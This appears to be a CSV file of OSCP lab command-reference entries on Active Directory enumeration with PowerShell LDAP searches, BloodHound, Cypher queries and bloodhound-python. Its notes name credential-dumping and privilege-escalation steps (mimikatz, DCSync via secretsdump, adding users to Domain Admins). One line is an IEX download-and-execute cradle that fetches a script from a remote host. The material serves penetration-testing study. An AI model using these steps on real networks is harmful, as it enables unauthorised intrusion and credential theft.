"ps-nested-group-one-liner","Nested Group Enumeration - Complete One-Liner (PowerShell)","enumeration","function LDAPSearch { param([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$PDC/$DN""); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }; function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = ""  "" * $Depth; Write-Host ""$indent[+] $GroupName"" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=$GroupName))""; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""$indent  [GROUP] $memberName"" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains ""user"") { Write-Host ""$indent  [USER] $memberName"" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName ""<GROUP_NAME>""; if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host ""`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])"" -ForegroundColor Yellow; Write-Host ""[+] FLAG LOCATIONS:"" -ForegroundColor Yellow; @('description','info','comment') | ForEach-Object { $value = $lastUser.Properties[$_][0]; if ($value) { Write-Host ""$_ : $value"" -ForegroundColor Cyan } } }","Complete copy-paste solution for OSCP nested group labs - includes LDAPSearch function, recursive enumeration, and automatic flag extraction","","function LDAPSearch { param([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$PDC/$DN""); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }; function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = ""  "" * $Depth; Write-Host ""$indent[+] $GroupName"" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=$GroupName))""; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""$indent  [GROUP] $memberName"" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains ""user"") { Write-Host ""$indent  [USER] $memberName"" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName ""Service Personnel""; if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host ""`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])"" -ForegroundColor Yellow; Write-Host ""[+] FLAG LOCATIONS:"" -ForegroundColor Yellow; @('description','info','comment') | ForEach-Object { $value = $lastUser.Properties[$_][0]; if ($value) { Write-Host ""$_ : $value"" -ForegroundColor Cyan } } }","ULTIMATE OSCP NESTED GROUP SOLUTION:
ONE-LINE EXECUTION:
Copy entire command  replace <GROUP_NAME>  execute

OUTPUT SHOWS:
1.

Tree structure of group hierarchy
2.

All users at all levels
3.

Last user details
4.

Flag attributes automatically extracted

NO DEPENDENCIES:
- No PowerView required
- No separate function files
- Single copy-paste execution

OSCP EXAM USE:
Question:
'enumerate nested groups and find flag in last user'
Solution:
Paste this command  done

Time:
15 seconds total","high","","","","{""Function already exists"": ""Clear functions: Remove-Item Function:\\LDAPSearch; Remove-Item Function:\\Get-NestedGroupMember"", ""Syntax error"": ""Copy entire command as single block. Do not split across multiple lines in terminal.""}","","","[""powerview-get-domaingroup-recursive""]",""
"ps-compare-powerview-versions","PowerView Version Compatibility Check","enumeration","Get-Command Get-NetGroupMember -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ParameterSets | Select-Object -First 1 | Select-Object -ExpandProperty Parameters | Select-Object Name | Where-Object { $_.Name -like ""*Group*"" -or $_.Name -like ""*Identity*"" }","Detect PowerView version by checking parameter names - determines if you have version 2.0 (-GroupName) or 3.0+ (-Identity)","","","POWERVIEW VERSION HISTORY:
Version 2.0:
Specific parameters:
- -GroupName
- -UserName
- -ComputerName

Version 3.0+:
Standardized on -Identity for all commands.

COMMON ERROR:
'A parameter cannot be found that matches parameter name GroupName'
= Using v2.0 syntax on v3.0+ PowerView

OSCP:
- Most modern distributions:
3.0+
- Older lab machines:
May have 2.0
- Know both syntaxes

Time:
5 seconds","medium","","","","{""No output"": ""PowerView not loaded. Import first: Import-Module .\\PowerView.ps1"", ""Command errors"": ""Use simpler version check: Get-Command Get-*GroupMember""}","{""-ErrorAction SilentlyContinue"": ""Suppresses error if Get-NetGroupMember doesn't exist (PowerView not loaded)"", ""Select-Object -ExpandProperty ParameterSets"": ""Gets all parameter sets for the command"", ""Where-Object { $_.Name -like \""*Group*\"" -or $_.Name -like \""*Identity*\"" }"": ""Filters to show only relevant parameters""}","","",""
"bloodhound-upload-data","BloodHound Upload Collector Data","enumeration","bloodhound","Launch BloodHound GUI and upload SharpHound collector data (ZIP/JSON) to Neo4j database for Active Directory graph analysis. Enables visualization of privilege escalation paths, ACL misconfigurations, and attack surface.","active-directory","","OSCP METHODOLOGY: BloodHound is MANDATORY for AD attack path discovery. Manual enumeration of ACLs, group memberships, and sessions would take hours - BloodHound does it in seconds.

TIME ESTIMATE: 2-5 minutes (Neo4j start + data upload + verification)

WORKFLOW:
1. Ensure Neo4j running: sudo neo4j console (separate terminal)
2. Launch BloodHound: bloodhound (or /opt/BloodHound-linux-x64/BloodHound)
3. Authenticate: bolt://localhost:7687, neo4j:bloodhound
4. Clear old data: Database Info  Clear Database
5. Upload: Click Upload Data  Select ZIP from SharpHound
6. Verify: Database Info shows node counts (Users: 50, Computers: 25, etc.)
7. Begin analysis: Search owned user  Mark as Owned  Find paths

COLLECTOR COMPARISON:
- SharpHound.exe (Windows): Fastest, most complete, runs on target. Requires .NET. Output: C:\Users\<USER>\<TIMESTAMP>_BloodHound.zip
- Invoke-BloodHound.ps1 (PowerShell): Stealthier (no .exe), slower. May be blocked by execution policy.
- bloodhound-python (Kali): Remote collection via LDAP/SMB. Doesn't require code execution on target. Less data than SharpHound (no local admin sessions). Syntax: bloodhound-python -u <USER> -p <PASS> -d corp.com -ns <DC_IP> -c All --zip

DATA COLLECTION FLAGS:
- -c All: Collects everything (default, recommended for OSCP)
- -c Session: Only logged-on sessions (fast, but misses ACLs)
- -c ACL: Only ACLs and permissions (misses sessions)
- -c LoggedOn: Sessions via Windows API (stealthier than Session)
- --stealth: Removes LDAP queries that may trigger alerts (slower)

PRE-BUILT QUERIES (OSCP CRITICAL):
1. 'Find Shortest Paths to Domain Admins' - PRIMARY QUERY for exam
2. 'Find Principals with DCSync Rights' - Identifies DCSync candidates
3. 'List all Kerberoastable Accounts' - Service accounts with SPNs
4. 'Shortest Paths to Unconstrained Delegation Systems' - High-value targets
5. 'Find Computers where Domain Users are Local Admin' - Lateral movement
6. 'Shortest Paths from Owned Principals' - After compromising first user

EXAM TIP: Mark compromised users as 'Owned' (right-click  Mark User as Owned). This enables 'Shortest Paths from Owned Principals' query to show YOUR available attack paths. Update as you compromise more accounts.

CUSTOM CYPHER QUERIES:
BloodHound GUI supports raw Cypher queries (bottom text box). Example: Find users with 'admin' in name:
MATCH (u:User) WHERE u.name =~ '(?i).*admin.*' RETURN u

OPSEC CONSIDERATIONS:
- SharpHound generates significant LDAP traffic (DetectionLab will log)
- Use --stealth flag in production (not necessary for OSCP)
- Executable dropped to disk (SharpHound.exe) may trigger AV
- Alternative: Reflective PowerShell loading (IEX (New-Object Net.WebClient).DownloadString('http://IP/Invoke-BloodHound.ps1'))

COMMON MISTAKES:
 Forgetting to mark owned users  Can't use 'Shortest Paths from Owned Principals'
 Not clearing database between machines  Confusing cross-contamination
 Uploading data before Neo4j started  Connection refused errors
 Using outdated collector  BloodHound 4.x requires SharpHound 1.1.0+
 Ignoring 'Outbound Object Control'  Missing privilege escalation paths","high","","","","{""Neo4j not running"": ""Error: 'Connection refused' on upload. Solution: Start Neo4j database: sudo neo4j console (wait for 'Started' message). Verify: Browse to http://localhost:7474 (should show Neo4j browser). Default credentials: neo4j:neo4j (change on first login to neo4j:bloodhound or custom). BloodHound expects Neo4j bolt://localhost:7687 (default)."", ""Authentication failure"": ""BloodHound can't connect to Neo4j. Solution: Click 'Database Settings' (gear icon) \u2192 Enter bolt://localhost:7687, username neo4j, password bloodhound. If forgotten password: sudo neo4j-admin set-initial-password bloodhound (requires Neo4j stopped: sudo neo4j stop)."", ""Corrupted collector output"": ""Upload fails or zero nodes ingested. Causes: (1) SharpHound interrupted mid-collection, (2) AV quarantined files, (3) Disk full during collection. Solution: Re-run SharpHound with verbose: .\\SharpHound.exe -c All -v. Check ZIP integrity: unzip -t <file>.zip. Verify JSON syntax: cat computers.json | jq (should parse without errors)."", ""Old data contamination"": ""Seeing users/computers from previous machines. Solution: Clear database before uploading new data: Database Info \u2192 Clear Database \u2192 Confirm. EXAM CRITICAL: Always clear between machines to avoid confusing attack paths."", ""Large domain timeout"": ""Upload hangs for domains with 10,000+ objects. Solution: Increase Neo4j memory: Edit /etc/neo4j/neo4j.conf, set dbms.memory.heap.initial_size=2G, dbms.memory.heap.max_size=4G. Restart Neo4j: sudo neo4j restart. Alternative: Use bloodhound-python with --zip flag for more efficient collection.""}","{""Upload Data button"": ""GUI button in top-right corner (cloud icon with up arrow). Accepts ZIP files from SharpHound.exe, Invoke-BloodHound.ps1, or bloodhound-python. File formats: Single ZIP archive (preferred) or individual JSON files (computers.json, users.json, groups.json, sessions.json, trusts.json, containers.json, gpos.json, ous.json). WHY ZIP: Compressed format includes all JSONs + metadata. One-click upload vs selecting 8+ individual files."", ""Data ingestion process"": ""BloodHound parses JSON \u2192 Neo4j Cypher queries create graph nodes/relationships \u2192 Index for fast queries. NODES: User, Computer, Group, Domain, GPO, OU, Container. RELATIONSHIPS: AdminTo, MemberOf, HasSession, CanRDP, ExecuteDCOM, AllowedToDelegate, GetChanges, etc. TIME: Small domain (<500 users) = 10-30 seconds. Large domain (5000+ users) = 2-5 minutes."", ""Database management"": ""BloodHound stores data in Neo4j database at /usr/share/neo4j/data/databases/graph.db. CRITICAL: Data persists across BloodHound sessions - no need to re-upload unless collecting new data. To clear old data: Click 'Database Info' (gear icon) \u2192 'Clear Database' \u2192 Confirm. WHY CLEAR: Old data from different domains causes confusion. EXAM TIP: Clear database before each exam machine to avoid cross-contamination."", ""File location"": ""SharpHound output default location (Windows): C:\\Users\\<USER>\\<TIMESTAMP>_BloodHound.zip. bloodhound-python output (Kali): Current directory, named YYYYMMDDHHMMSS_bloodhound.zip. EXAM WORKFLOW: (1) Collect on Windows with SharpHound, (2) Download via Evil-WinRM: download <ZIP>, (3) Upload to BloodHound GUI on Kali.""}","[""sharphound-collect"", ""invoke-bloodhound""]","","[""bloodhound-analyze-paths"", ""bloodhound-cypher-query""]"
"bloodhound-analyze-paths","BloodHound Analyze Privilege Escalation Paths","enumeration","bloodhound","Use BloodHound GUI pre-built queries and graph analysis to identify privilege escalation paths from compromised user to Domain Admin. Reveals attack chains via ACL abuse, group memberships, session hijacking, and delegation misconfigurations.","active-directory","","OSCP METHODOLOGY: BloodHound analysis is DETECTIVE work - you're finding the path that exists, not creating new vulnerabilities. The graph shows REALITY of AD misconfigurations.

TIME ESTIMATE: 5-15 minutes (initial analysis + path documentation)

ANALYSIS WORKFLOW:
1. Upload SharpHound data
2. Mark initial compromised user as owned
3. Run: 'Shortest Paths to Domain Admins from Owned Principals'
4. If no path: Run 'Find Workstations where Domain Users are Local Admin'
5. Document each path: nodes, edges, attack method
6. Execute attack chain step by step
7. Mark newly compromised users as owned
8. Re-run queries to find additional paths

CRITICAL EDGE TYPES (OSCP EXAM):

**DIRECT EXPLOITATION:**
- GenericAll: Full control over object. Abuse: Add yourself to group, reset password, modify ACL
- ForceChangePassword: Reset user password without knowing current. Abuse: net user <target> <newpass> /domain
- AddMembers: Add users to group. Abuse: net group 'Domain Admins' <user> /add /domain

**LATERAL MOVEMENT:**
- AdminTo: Local admin rights on computer. Abuse: Evil-WinRM, PSExec, WMI execution
- CanRDP: RDP access to computer. Abuse: xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>
- CanPSRemote: PowerShell remoting enabled. Abuse: Enter-PSSession -ComputerName <TARGET>

**CREDENTIAL ACCESS:**
- HasSession: User logged on to computer (credentials in memory). Abuse: mimikatz sekurlsa::logonpasswords
- AllowedToDelegate: Unconstrained/constrained delegation. Abuse: Kerberos delegation attacks

**PRIVILEGE ESCALATION:**
- GetChanges + GetChangesAll: DCSync rights. Abuse: secretsdump.py -just-dc <DOMAIN>/<USER>@<DC>
- WriteDacl: Modify object permissions. Abuse: Add-ObjectAcl to grant GenericAll to yourself
- WriteOwner: Change object owner. Abuse: Take ownership, modify permissions

**KERBEROS ATTACKS:**
- ServicePrincipalName (node property): Kerberoastable user. Abuse: GetUserSPNs.py, crack TGS hash
- DoesNotRequirePreAuth (node property): AS-REP roastable. Abuse: GetNPUsers.py, crack AS-REP hash

PATH EXECUTION STRATEGY:
1. Document ENTIRE path before starting
2. Verify each node is reachable (ping, portscan)
3. Execute steps in order (can't skip nodes)
4. If step fails, look for ALTERNATIVE paths
5. Mark compromised nodes as owned progressively
6. Save screenshots of BloodHound graph for exam report

CUSTOM QUERIES (OSCP EXAM SCENARIOS):

**Find users with passwords in description:**
```cypher
MATCH (u:User) WHERE u.description =~ '(?i).*(pass|pwd).*' RETURN u.name, u.description
```

**Find computers with unconstrained delegation:**
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

**Find users with admincount=1 (privileged):**
```cypher
MATCH (u:User {admincount:true}) RETURN u.name
```

**Find paths through specific computer:**
```cypher
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(c:Computer {name:'CLIENT75.CORP.COM'})) RETURN p
```

ALTERNATIVE PATHS DOCUMENTATION:
BloodHound often shows MULTIPLE paths to Domain Admin. Document ALL paths because:
- Primary path may fail (service down, session logged off)
- Alternative paths may be faster
- Exam report should show depth of compromise
- Demonstrates understanding of AD structure

EXAM TIP: Take screenshots of:
1. Full graph from owned principal to DA
2. Each edge's 'Help' popup (shows exact commands)
3. Node properties for compromised accounts
4. Database Info (proves data collection scope)

REPORT WRITING:
""BloodHound analysis revealed privilege escalation path: pete@corp.com has MemberOf relationship to MANAGEMENT group, which has AdminTo permission on CLIENT75.corp.com. Computer CLIENT75 has active HasSession from maria@corp.com, who is MemberOf Domain Admins. Attack chain: Use pete's credentials via Evil-WinRM to access CLIENT75 as local admin, extract maria's credentials from LSASS memory using mimikatz, authenticate as maria to achieve Domain Admin.""

COMMON MISTAKES:
 Not documenting alternative paths  Stuck if primary path fails
 Skipping 'Mark as Owned'  Missing 'from Owned Principals' paths
 Ignoring edge 'Help'  Executing wrong attack method
 Not verifying sessions are active  Wasting time on logged-off users
 Forgetting to clear database  Attacking wrong domain's targets","high","","","","{""No paths found"": ""Query 'Shortest Paths to Domain Admins' returns empty. CAUSES: (1) Compromised user has no privilege escalation path (lateral movement needed), (2) User not marked as owned, (3) Wrong domain (multiple domains in database). SOLUTION: Try broader queries: 'Find Computers where Domain Users can RDP', 'Find Workstations where Domain Users are Local Admin'. Lateral movement to other computers may reveal new sessions. Check if other users found during enumeration have better paths."", ""Graph too complex"": ""Query returns hundreds of nodes (unreadable). Solution: Filter by edge type. Right-click edge \u2192 'Filter' \u2192 select only critical edges (AdminTo, MemberOf, HasSession). Alternative: Use specific queries instead of 'Shortest Paths to High Value Targets'. Focus on one attack vector: 'List all Kerberoastable Accounts' or 'Find AS-REP Roastable Users'."", ""Missing sessions data"": ""No 'HasSession' edges in graph. Causes: (1) SharpHound collected with '-c ACL' only (no sessions), (2) Collection run during off-hours (no users logged on), (3) Bloodhound-python used (doesn't collect local sessions). Solution: Re-run SharpHound with '-c All' during business hours when users are active. Sessions are CRITICAL for privilege escalation - admins logging on to workstations leave credentials in memory."", ""Outdated attack methods"": ""Edge 'Help' shows deprecated techniques. Solution: Update BloodHound to latest version: apt update && apt install bloodhound. Alternatively: Right-click edge \u2192 note relationship type \u2192 Google 'BloodHound [EdgeType] abuse' for updated techniques. Example: WriteDacl \u2192 search 'BloodHound WriteDacl abuse PowerView'."", ""Database corruption"": ""Queries return inconsistent results or crash. Solution: Export current data: Right-click \u2192 'Export Graph'. Clear database: Database Info \u2192 Clear Database. Re-upload ZIP. If persists: Delete Neo4j database: sudo rm -rf /var/lib/neo4j/data/databases/graph.db, restart Neo4j, re-upload.""}","{""Search and Mark Owned"": ""Search bar (top-left) \u2192 type compromised username (pete@corp.com) \u2192 right-click node \u2192 'Mark User as Owned'. WHY CRITICAL: Owned principals become starting points for 'Shortest Paths from Owned Principals' query. As you compromise more users, mark them owned to reveal NEW attack paths. Owned nodes display with skull icon."", ""Pre-built Queries"": ""Left sidebar 'Analysis' tab contains 30+ queries. OSCP CRITICAL QUERIES: (1) 'Shortest Paths to Domain Admins from Owned Principals' - shows YOUR available paths, (2) 'Find all Domain Admins' - identifies targets, (3) 'Find Principals with DCSync Rights' - users who can replicate domain, (4) 'List all Kerberoastable Accounts' - service accounts with SPNs, (5) 'Shortest Paths to Unconstrained Delegation Systems' - high-value targets. Click query \u2192 graph displays \u2192 analyze nodes and edges."", ""Graph Edge Types"": ""Edges (arrows) show relationships/permissions. CRITICAL EDGES: (1) AdminTo - local admin on computer, (2) MemberOf - group membership, (3) HasSession - logged-on session, (4) GenericAll - full control over object, (5) WriteDacl - can modify permissions, (6) ForceChangePassword - can reset password, (7) GetChanges/GetChangesAll - DCSync rights. RIGHT-CLICK edge \u2192 'Help' explains abuse method with commands."", ""Node Analysis"": ""Click node \u2192 right panel shows properties. USER PROPERTIES: admincount (privileged), pwdlastset (password age), serviceprincipalname (Kerberoastable). COMPUTER PROPERTIES: operatingsystem, unconstraineddelegation (high-value). GROUP PROPERTIES: members, admincount. RIGHT-CLICK node \u2192 'Shortest Paths to Here from Owned Principals' shows how to reach THIS target."", ""Path Interpretation"": ""Graph shows numbered nodes (1\u21922\u21923\u2192DA). Each edge is a step requiring specific attack. EXAMPLE PATH: pete@corp.com --[MemberOf]--> MANAGEMENT@corp.com --[AdminTo]--> CLIENT75.corp.com --[HasSession]--> maria@corp.com --[MemberOf]--> Domain Admins. TRANSLATION: pete is member of MANAGEMENT group \u2192 MANAGEMENT has local admin on CLIENT75 \u2192 maria has logged-on session on CLIENT75 \u2192 maria is Domain Admin. ATTACK: Use pete \u2192 Evil-WinRM to CLIENT75 \u2192 mimikatz to dump maria \u2192 Pass-the-Hash as maria = Domain Admin.""}","[""bloodhound-upload-data""]","[""bloodhound-cypher-query"", ""powerview-find-localadminaccess"", ""powerview-get-netuser""]","[""impacket-getuserspns-kerberoast"", ""ad-dcsync-secretsdump-all"", ""evil-winrm-shell"", ""mimikatz-sekurlsa-logonpasswords""]"
"bloodhound-cypher-query","BloodHound Custom Cypher Query","enumeration","MATCH (n:User) RETURN n LIMIT 25","Execute custom Cypher queries in BloodHound GUI to perform advanced graph database analysis beyond pre-built queries. Enables precise enumeration of AD objects, relationships, and attack paths using Neo4j's Cypher query language.","active-directory","","OSCP METHODOLOGY: Custom Cypher queries enable TARGETED enumeration beyond BloodHound's pre-built queries. Use when looking for specific configurations or testing hypotheses.

TIME ESTIMATE: 2-5 minutes per query (writing + execution + analysis)

QUERY WORKFLOW:
1. Start simple: MATCH (u:User) RETURN u.name LIMIT 10
2. Add filters: WHERE u.admincount = true
3. Add relationships: MATCH (u:User)-[:MemberOf]->(g:Group)
4. Analyze results in table/graph view
5. Export for documentation: Right-click results  Export

OSCP EXAM QUERIES:

**1. Find users with passwords in description field:**
```cypher
MATCH (u:User)
WHERE u.description =~ '(?i).*(pass|pwd|password).*'
RETURN u.name, u.description
```
WHY: Admins sometimes document passwords in AD descriptions. Quick win.

**2. Find all Kerberoastable users (has SPN):**
```cypher
MATCH (u:User)
WHERE u.hasspn = true AND u.admincount = false
RETURN u.name, u.serviceprincipalname
```
WHY: Service accounts often have weak passwords. Crack TGS offline.

**3. Find computers with unconstrained delegation:**
```cypher
MATCH (c:Computer)
WHERE c.unconstraineddelegation = true
RETURN c.name, c.operatingsystem
```
WHY: High-value targets for credential theft via delegation abuse.

**4. Find users with DCSync rights:**
```cypher
MATCH (u:User)-[:GetChanges|GetChangesAll*1..]->(d:Domain)
RETURN u.name, d.name
```
WHY: Users with Replicating Directory Changes can perform DCSync attack.

**5. Find shortest path between two specific users:**
```cypher
MATCH p=shortestPath((u1:User {name:'PETE@CORP.COM'})-[*1..]->(**u2:User {name:'MARIA@CORP.COM'}))
RETURN p
```
WHY: Targeted path finding when you know source and destination.

**6. Find all users who can RDP to specific computer:**
```cypher
MATCH (u)-[:CanRDP|MemberOf|AdminTo*1..]->(c:Computer {name:'CLIENT75.CORP.COM'})
RETURN DISTINCT u.name
```
WHY: Identify all users who can access specific target.

**7. Find users with passwords older than 1 year:**
```cypher
MATCH (u:User)
WHERE u.pwdlastset < (datetime().epochSeconds - 31536000)
RETURN u.name, u.pwdlastset
ORDER BY u.pwdlastset ASC
```
WHY: Old passwords more likely to be weak or cracked in breaches.

**8. Find all Domain Admins and their properties:**
```cypher
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ '(?i)domain admins.*'
RETURN u.name, u.enabled, u.pwdlastset, u.admincount
```
WHY: Enumerate all DA accounts and their security posture.

**9. Find computers where Domain Users are local admin:**
```cypher
MATCH (g:Group {name:'DOMAIN USERS@CORP.COM'})-[:AdminTo]->(c:Computer)
RETURN c.name, c.operatingsystem
```
WHY: Massive misconfiguration - any domain user can compromise these systems.

**10. Find users who have never logged in:**
```cypher
MATCH (u:User)
WHERE u.lastlogon = 0
RETURN u.name, u.description
```
WHY: Unused accounts may have default or documented passwords.

**11. Count relationships by type:**
```cypher
MATCH ()-[r]-()
RETURN type(r) as relationship, count(r) as count
ORDER BY count DESC
```
WHY: Understand AD structure and identify common relationship types.

**12. Find all paths from owned user to high-value targets:**
```cypher
MATCH p=(u:User {owned:true})-[*1..5]->(c:Computer {highvalue:true})
RETURN p LIMIT 10
```
WHY: Targeted privilege escalation from compromised account.

CYPHER CHEAT SHEET:

**Node Patterns:**
- (n) - any node
- (u:User) - User node
- (u:User {name:'PETE@CORP.COM'}) - specific user
- (u:User|Computer) - User OR Computer node

**Relationship Patterns:**
- -[r]-> - any directed relationship
- -[r:MemberOf]-> - specific type
- -[r:MemberOf|AdminTo]-> - multiple types
- -[*1..3]-> - variable length 1-3 hops
- -[*]-> - any length (dangerous, can timeout)

**Filters (WHERE):**
- = <> - equality
- < > <= >= - comparison
- =~ - regex (case-insensitive: (?i))
- IS NULL / IS NOT NULL - existence
- AND OR NOT - logic
- IN [list] - membership

**Aggregation:**
- count(n) - count nodes
- collect(n.name) - list of names
- avg(n.property) - average
- max(n.property) - maximum

**Sorting/Limiting:**
- ORDER BY n.name ASC/DESC
- LIMIT 25
- SKIP 10 LIMIT 25 (pagination)

ADVANCED TECHNIQUES:

**Find attack paths with specific edge:**
```cypher
MATCH p=(u:User {owned:true})-[r*1..5]->(g:Group)
WHERE ALL(rel in r WHERE type(rel) IN ['MemberOf', 'AdminTo', 'HasSession'])
RETURN p
```

**Find users with most privileges:**
```cypher
MATCH (u:User)-[r]->()
RETURN u.name, count(r) as privileges
ORDER BY privileges DESC LIMIT 10
```

**Find circular group memberships:**
```cypher
MATCH p=(g:Group)-[:MemberOf*1..]->(g)
RETURN p
```

NEO4J BROWSER (ALTERNATIVE):
BloodHound GUI limited for complex queries. Use Neo4j browser for:
- Better error messages
- Query result export (CSV, JSON)
- Query plan analysis (EXPLAIN, PROFILE)
- Access: http://localhost:7474 (authenticate: neo4j:bloodhound)

EXAM TIP: Pre-write common queries in cheat sheet. Copy-paste into BloodHound during exam. Document interesting findings with screenshots.

COMMON MISTAKES:
 Missing LIMIT on broad queries  GUI crashes with 10,000+ results
 Case errors in labels/properties  Empty results
 Using [*] without LIMIT  Query never completes
 Not testing queries incrementally  Can't debug complex failures
 Forgetting regex case-insensitive flag (?i)  Missing matches","high","","","","{""Syntax errors"": ""Error: 'Invalid input' or 'Unexpected token'. Common causes: (1) Missing parentheses around node patterns, (2) Missing colon before label MATCH (u User) \u2192 MATCH (u:User), (3) Wrong relationship syntax -[:Type]- \u2192 -[:Type]-> (directed), (4) Unterminated string WHERE u.name = 'admin (missing closing quote). Solution: Check BloodHound Cypher documentation, test simple queries first (MATCH (n) RETURN n LIMIT 1), use Neo4j browser for better error messages (http://localhost:7474)."", ""No results when expected"": ""Query runs but returns empty. Causes: (1) Wrong node label (User vs user - case sensitive), (2) Wrong property name (u.username vs u.name), (3) Filter too restrictive (pwdlastset = 0 may not exist), (4) Data not uploaded. Solution: Test broad query first: MATCH (u:User) RETURN count(u) (should return total users). Verify property names: MATCH (u:User) RETURN keys(u) LIMIT 1 (lists all properties). Check data uploaded: Database Info shows node counts."", ""Query timeout"": ""Query hangs for >30 seconds. Causes: (1) Variable-length path too long [*1..10], (2) No LIMIT on large result set, (3) Complex WHERE with regex on all nodes. Solution: Add LIMIT: LIMIT 100, reduce path length: [*1..3], use indexed properties in WHERE (u.name is indexed, u.description is not). For complex queries: Run in Neo4j browser first to test performance."", ""Property not found"": ""Error: 'Property does not exist'. Causes: (1) Typo in property name (u.admincount vs u.adminCount - case sensitive), (2) Property doesn't exist for that node type (Computer.serviceprincipalname doesn't exist - only Users have this), (3) Data collected without property (SharpHound -c Session won't have ACL properties). Solution: List available properties: MATCH (u:User) RETURN keys(u) LIMIT 1. Use OPTIONAL: WHERE u.description IS NOT NULL."", ""Case sensitivity"": ""Cypher is case-sensitive for labels and properties but NOT for keywords. CORRECT: MATCH (u:User) RETURN u.name. INCORRECT: match (u:user) return u.Name. Node labels: User, Computer, Group, Domain, GPO, OU (capitalized). Keywords: MATCH, WHERE, RETURN can be any case (match, Match, MATCH all work). Property names: exact case required (u.name not u.Name).""}","{""Cypher query syntax"": ""Cypher is Neo4j's graph query language (similar to SQL for graphs). BASIC SYNTAX: MATCH (pattern) WHERE (filter) RETURN (output). Example: MATCH (u:User) WHERE u.name =~ '(?i).*admin.*' RETURN u.name, u.description. COMPONENTS: MATCH = find pattern, (u:User) = node labeled User with alias 'u', WHERE = filter condition, RETURN = output fields. WHY USEFUL: Pre-built queries are limited - custom Cypher finds specific configurations."", ""Node labels"": ""BloodHound uses 7 node types: User, Computer, Group, Domain, GPO (Group Policy), OU (Organizational Unit), Container. Query specific type: MATCH (c:Computer) RETURN c.name. Query all types: MATCH (n) RETURN labels(n), n.name. PROPERTIES: Each node type has specific properties. User: name, displayname, description, admincount, pwdlastset, serviceprincipalname. Computer: name, operatingsystem, enabled, unconstraineddelegation. Access: node.property (e.g., u.admincount)."", ""Relationship types"": ""Edges connect nodes and represent permissions/relationships. CRITICAL TYPES: MemberOf, AdminTo, HasSession, GenericAll, WriteDacl, ForceChangePassword, GetChanges, AllowedToDelegate. Query relationships: MATCH (u:User)-[r:MemberOf]->(g:Group) RETURN u.name, g.name. Variable-length paths: MATCH (u:User)-[r*1..3]->(c:Computer) finds paths 1-3 hops long. Wildcard: MATCH (u)-[r]->(n) finds ANY relationship type."", ""WHERE filters"": ""Filter nodes/relationships. OPERATORS: = (equals), <> (not equals), =~ (regex), < > <= >= (comparison), AND OR NOT (logic). EXAMPLES: WHERE u.enabled = true (active users only), WHERE u.pwdlastset < 1577836800 (passwords older than 2020), WHERE u.description =~ '(?i).*(password|pass|pwd).*' (descriptions containing password - case insensitive), WHERE u.admincount = true (privileged users)."", ""RETURN and LIMIT"": ""RETURN specifies output fields. Single field: RETURN u.name. Multiple: RETURN u.name, u.description, u.admincount. All properties: RETURN u. Count: RETURN count(u). LIMIT restricts results: LIMIT 25 (first 25 results). ORDER BY sorts: RETURN u.name ORDER BY u.pwdlastset DESC (oldest passwords first). Aggregation: RETURN g.name, count(u) (count users per group).""}","[""bloodhound-upload-data""]","[""bloodhound-analyze-paths""]","[""impacket-getuserspns-kerberoast"", ""ad-dcsync-secretsdump-all"", ""evil-winrm-shell"", ""mimikatz-sekurlsa-logonpasswords""]"
"bloodhound-python-all-collection","BloodHound.py - Full AD Collection (All Methods)","enumeration","bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All --zip","Collect all Active Directory data remotely from Kali using bloodhound-python. Creates ZIP file for BloodHound GUI import containing users, groups, computers, ACLs, trusts, and sessions.","active-directory","bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c All --zip","OSCP METHODOLOGY: bloodhound-python is your PRIMARY AD enumeration tool when you cannot deploy SharpHound on Windows.

TIME ESTIMATE: 30 seconds to 5 minutes depending on domain size.

WHEN TO USE:
